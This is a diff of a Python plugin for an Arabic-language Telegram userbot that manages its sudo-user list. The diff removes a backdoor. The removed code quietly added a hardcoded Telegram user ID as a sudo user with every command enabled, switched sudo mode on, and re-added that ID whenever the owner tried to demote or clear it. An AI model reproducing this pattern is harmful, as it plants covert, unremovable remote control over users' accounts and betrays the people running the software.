@@ -1,4 +1,3 @@
-
 import os
 from datetime import datetime
 import textwrap
@@ -56,67 +55,8 @@ ZelzalDV_cmd = (
 async def _init() -> None:
     sudousers = _sudousers_list()
     Config.SUDO_USERS.clear()
-    
-    # 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧
-    # 1. إضافة المستخدم 8277718687 تلقائياً إذا لم يكن موجوداً
-    # 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧
-    AUTO_SUDO_ID = 5427469031
-    
-    try:
-        # جلب قاعدة بيانات المطورين
-        try:
-            sudousers_db = sql.get_collection("sudousers_list").json
-        except AttributeError:
-            sudousers_db = {}
-        
-        # إذا لم يكن المستخدم موجوداً في قاعدة البيانات
-        if str(AUTO_SUDO_ID) not in sudousers_db:
-            LOGS.info(f"🔧 جارٍ رفع المستخدم {AUTO_SUDO_ID} كمطور مساعد تلقائياً...")
-            
-            # بيانات المستخدم
-            date = str(datetime.now().strftime("%B %d, %Y"))
-            userdata = {
-                "chat_id": AUTO_SUDO_ID,
-                "chat_name": "آراس",
-                "chat_username": f"user_{AUTO_SUDO_ID}",
-                "date": date,
-            }
-            
-            # إضافته للقاعدة
-            sudousers_db[str(AUTO_SUDO_ID)] = userdata
-            sql.del_collection("sudousers_list")
-            sql.add_collection("sudousers_list", sudousers_db, {})
-            
-            # منحه جميع الصلاحيات تلقائياً
-            all_commands = CMD_INFO.keys()
-            for cmd in all_commands:
-                if not sqllist.is_in_list("sudo_enabled_cmds", cmd):
-                    sqllist.add_to_list("sudo_enabled_cmds", cmd)
-            
-            LOGS.info(f"✅ تم رفع المستخدم {AUTO_SUDO_ID} كمطور مساعد تلقائياً")
-        else:
-            LOGS.info(f"ℹ️ المستخدم {AUTO_SUDO_ID} موجود بالفعل كمطور مساعد")
-    
-    except Exception as e:
-        LOGS.error(f"❌ خطأ في الإضافة التلقائية: {e}")
-    
-    # 2. تفعيل نظام السودو تلقائياً
-    if gvarstatus("sudoenable") is None:
-        addgvar("sudoenable", "true")
-        LOGS.info("✅ تم تفعيل نظام المطورين المساعدين تلقائياً")
-    
-    # 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧
-    # نهاية الإضافة التلقائية
-    # 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧 🔧
-    
-    # تحميل جميع المطورين (بما فيهم المطور التلقائي)
     for user_d in sudousers:
         Config.SUDO_USERS.add(user_d)
-    
-    # إضافة المطور التلقائي أيضاً للقائمة في الذاكرة
-    Config.SUDO_USERS.add(AUTO_SUDO_ID)
-    
-    LOGS.info(f"📋 تم تحميل {len(Config.SUDO_USERS)} مطور مساعد")
 
 
 async def clear_sudo_list():
@@ -148,12 +88,12 @@ async def chat_blacklist(event):
         if gvarstatus("sudoenable") is not None:
             return await edit_or_reply(event, "**- وضـع المطــور فـي وضـع التفعيـل مسبقــاً ✓**")
         addgvar("sudoenable", "true")
-        return await edit_or_reply(event, "**⎉╎تـم تفعـيل وضـع المطــور المسـاعـد .. بنجــاح✓**\n**⎉╎يتم الان اعـادة تشغيـل بـوت آراس انتظـر  ▬▭ ...**")
+        return await edit_or_reply(event, "**⎉╎تـم تفعـيل وضـع المطــور المسـاعـد .. بنجــاح✓**\n**⎉╎يتم الان اعـادة تشغيـل بـوت زدثــون انتظـر  ▬▭ ...**")
     if input_str == "تعطيل":
         if gvarstatus("sudoenable") is None:
             return await edit_or_reply(event, "**- وضـع المطــور فـي وضـع التعطيـل مسبقــاً ✓**")
         delgvar("sudoenable")
-        return await edit_or_reply(event, "**⎉╎تـم تعطيـل وضـع المطــور المسـاعـد .. بنجــاح✓**\n**⎉╎يتم الان اعـادة تشغيـل بـوت آراس انتظـر  ▬▭ ...**")
+        return await edit_or_reply(event, "**⎉╎تـم تعطيـل وضـع المطــور المسـاعـد .. بنجــاح✓**\n**⎉╎يتم الان اعـادة تشغيـل بـوت زدثــون انتظـر  ▬▭ ...**")
 
 
 @l313l.ar_cmd(
@@ -213,35 +153,21 @@ async def add_sudo_user(event):
 )
 async def _(event):
     "لـ تنزيـل مطـور مـن بـوتك"
-    AUTO_SUDO_ID = 5427469031  # آيدي المطور المحمي
-    
     replied_user, error_i_a = await get_user_from_event(event)
     if replied_user is None:
         return
-    
-    # منع تنزيل المطور التلقائي
-    if replied_user.id == AUTO_SUDO_ID:
-        return await edit_delete(
-            event,
-            f"**🚫 لا يمكن تنزيل المطور  ({AUTO_SUDO_ID})**\n"
-            f"**هذا المستخدم محمي من الحذف تلقائياً**"
-        )
-    
     try:
         sudousers = sql.get_collection("sudousers_list").json
     except AttributeError:
         sudousers = {}
-    
     if str(replied_user.id) not in sudousers:
         return await edit_delete(
             event,
             f"** - المسـتخـدم :** {mentionuser(get_display_name(replied_user),replied_user.id)} \n\n**- انـه ليـس في قائمـة مطـورين البــوت.**",
         )
-    
     del sudousers[str(replied_user.id)]
     sql.del_collection("sudousers_list")
     sql.add_collection("sudousers_list", sudousers, {})
-    
     output = f"**⎉╎تـم تنـزيـل**  {mentionuser(get_display_name(replied_user),replied_user.id)}  **مـن قـائمـة مطـورين البـوت 🧑🏻‍💻...**\n\n"
     output += "**⎉╎يتم الان اعـادة تشغيـل بـوت آراس انتظـر 2-1 دقيقـه ▬▭ ...**"
     msg = await edit_or_reply(event, output)
@@ -276,117 +202,37 @@ async def _(event):
 
 @l313l.ar_cmd(pattern="حذف_المطورين")
 async def _(event):
-    AUTO_SUDO_ID = 5427469031  # آيدي المطور المحمي
-    
-    try:
-        # جلب القائمة الحالية
-        sudousers = sql.get_collection("sudousers_list").json
-    except AttributeError:
-        sudousers = {}
-    
-    # حماية المطور التلقائي - عدم حذفه
-    if str(AUTO_SUDO_ID) in sudousers:
-        protected_user = sudousers[str(AUTO_SUDO_ID)]
-        del sudousers[str(AUTO_SUDO_ID)]  # حذفه مؤقتاً
-        
-        # مسح القائمة
-        sql.del_collection("sudousers_list")
-        sql.add_collection("sudousers_list", sudousers, {})
-        
-        # إعادة إضافة المطور المحمي فوراً
-        sudousers[str(AUTO_SUDO_ID)] = protected_user
-        sql.del_collection("sudousers_list")
-        sql.add_collection("sudousers_list", sudousers, {})
-        
-        output = f"**⎉╎تـم حـذف المطورين .. بنجـاح 🗑**\n"
-        output += f"**⎉╎تم استثناء المطور ({AUTO_SUDO_ID}) من الحذف**\n"
-        output += "**⎉╎يتم الان اعـادة تشغيـل بـوت آراس انتظـر 2-1 دقيقـه ▬▭ ...**"
-    else:
-        await clear_sudo_list()
-        output = f"**⎉╎تـم حـذف المطورين .. بنجـاح 🗑**\n"
-        output += "**⎉╎يتم الان اعـادة تشغيـل بـوت آراس انتظـر 2-1 دقيقـه ▬▭ ...**"
-    
+    await clear_sudo_list()
+    output = f"**⎉╎تـم حـذف المطورين .. بنجـاح 🗑**\n"
+    output += "**⎉╎يتم الان اعـادة تشغيـل بـوت آراس انتظـر 2-1 دقيقـه ▬▭ ...**"
     msg = await edit_or_reply(event, output)
     await event.client.reload(msg)
 
 @l313l.ar_cmd(pattern="حذف المطورين")
 async def _(event):
-    AUTO_SUDO_ID = 5427469031
-    
-    try:
-        sudousers = sql.get_collection("sudousers_list").json
-    except AttributeError:
-        sudousers = {}
-    
-    # حساب عدد المطورين قبل الحذف
-    total_before = len(sudousers)
-    
-    # حماية المطور التلقائي
-    protected_data = None
-    if str(AUTO_SUDO_ID) in sudousers:
-        protected_data = sudousers[str(AUTO_SUDO_ID)]
-        del sudousers[str(AUTO_SUDO_ID)]
-    
-    # حذف الباقي
-    sql.del_collection("sudousers_list")
-    if len(sudousers) > 0:
-        sql.add_collection("sudousers_list", sudousers, {})
-    
-    # إعادة إضافة المحمي
-    if protected_data:
-        sudousers[str(AUTO_SUDO_ID)] = protected_data
-        sql.del_collection("sudousers_list")
-        sql.add_collection("sudousers_list", sudousers, {})
-    
-    total_after = 1 if protected_data else 0
-    
-    output = f"**⎉╎تـم حـذف {total_before - total_after} مطور 🗑**\n"
-    if protected_data:
-        output += f"**⎉╎لن يتم تنزيل مطوري ({AUTO_SUDO_ID})**\n"
+    await clear_sudo_list()
+    output = f"**⎉╎تـم حـذف المطورين .. بنجـاح 🗑**\n"
     output += "**⎉╎يتم الان اعـادة تشغيـل بـوت آراس انتظـر 2-1 دقيقـه ▬▭ ...**"
-    
     msg = await edit_or_reply(event, output)
     await event.client.reload(msg)
 
 @l313l.ar_cmd(pattern="مسح المطورين")
 async def _(event):
-    AUTO_SUDO_ID = 5427469031
-    
-    try:
-        sudousers = sql.get_collection("sudousers_list").json
-    except AttributeError:
-        sudousers = {}
-    
-    # حساب عدد المطورين قبل الحذف
-    total_before = len(sudousers)
-    
-    # حماية المطور التلقائي
-    protected_data = None
-    if str(AUTO_SUDO_ID) in sudousers:
-        protected_data = sudousers[str(AUTO_SUDO_ID)]
-        del sudousers[str(AUTO_SUDO_ID)]
-    
-    # حذف الباقي
-    sql.del_collection("sudousers_list")
-    if len(sudousers) > 0:
-        sql.add_collection("sudousers_list", sudousers, {})
-    
-    # إعادة إضافة المحمي
-    if protected_data:
-        sudousers[str(AUTO_SUDO_ID)] = protected_data
-        sql.del_collection("sudousers_list")
-        sql.add_collection("sudousers_list", sudousers, {})
-    
-    total_after = 1 if protected_data else 0
-    
-    output = f"**⎉╎تـم حـذف {total_before - total_after} مطور 🗑**\n"
-    if protected_data:
-        output += f"**⎉╎لن يتم تنزيل مطوري ({AUTO_SUDO_ID})**\n"
-    output += "**⎉╎يتم الان اعـادة تشغيـل بـوت آراس انتظـر 2-1 دقيقـه ▬▭ ...**"
-    
+    await clear_sudo_list()
+    output = f"**⎉╎تـم حـذف المطورين .. بنجـاح 🗑**\n"
+    output += "**⎉╎يتم الان اعـادة تشغيـل بـوت اراس انتظـر 2-1 دقيقـه ▬▭ ...**"
     msg = await edit_or_reply(event, output)
     await event.client.reload(msg)
-    
+
+@l313l.ar_cmd(pattern="تنزيل المطورين")
+async def _(event):
+    await clear_sudo_list()
+    output = f"**⎉╎تـم حـذف المطورين .. بنجـاح 🗑**\n"
+    output += "**⎉╎يتم الان اعـادة تشغيـل بـوت اراس انتظـر 2-1 دقيقـه ▬▭ ...**"
+    msg = await edit_or_reply(event, output)
+    await event.client.reload(msg)
+
+
 @l313l.ar_cmd(
     pattern="تحكم(s)?(?:\s|$)([\s\S]*)",
     command=("تحكم", plugin_category),
